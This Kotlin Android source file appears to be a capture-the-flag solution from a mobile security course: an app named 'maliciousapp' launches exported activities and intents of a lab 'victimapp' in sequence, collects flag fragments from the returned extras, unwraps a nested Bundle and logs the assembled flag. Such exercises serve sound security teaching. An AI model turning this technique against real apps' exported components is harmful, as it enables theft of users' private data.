package com.example.maliciousapp

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.TextView

import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    val TAG = "MOBIOTSEC"
    val contract = ActivityResultContracts.StartActivityForResult()

    var partialFlag = ""

    val partOne = registerForActivityResult(contract) { result ->
        val flagPart = result
            .data
            ?.getStringExtra("flag")
            ?: "[null]"

        Log.d(TAG, "Part 1: $flagPart")
        partialFlag += flagPart
        partTwo.launch(Intent("com.example.victimapp.intent.action.JUSTASK"))
    }
    val partTwo = registerForActivityResult(contract) { result ->
        val flagPart = result
            .data
            ?.getStringExtra("flag")
            ?: "[null]"

        Log.d("MOBIOTSEC", "Part 2: $flagPart")
        partialFlag += flagPart

        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.PartThree"
            )
        }
        partThree.launch(intent)
    }
    val partThree = registerForActivityResult(contract) { result ->
        val flagPart = result
            .data
            ?.getStringExtra("hiddenFlag")
            ?: "[null]"

        Log.d("MOBIOTSEC", "Part 3: $flagPart")
        partialFlag += flagPart

        partFour.launch(Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE"))
    }
    val partFour = registerForActivityResult(contract) { result ->
        val extras = result
            .data
            ?.getExtras()
        extras?.let {
            val flagPart = unwrapBundle(it)
            Log.d("MOBIOTSEC", "Part 4: $flagPart")

            val view = findViewById<TextView>(R.id.debug_text)
            val flag = partialFlag + flagPart
            view.text = flag
            Log.d("MOBIOTSEC", "The flag is $flag")
        }
    }

    fun unwrapBundle(bundle: Bundle): String {
        // Get the first key (assume only one key in the bundle)
        val key = bundle
            .keySet()
            .iterator()
            .next()

        bundle.getBundle(key)?.let {
            return unwrapBundle(it)
        }
        return bundle.getString(key) ?: "[null]"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val intent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.PartOne"
            )
        }
        partOne.launch(intent)
    }
}
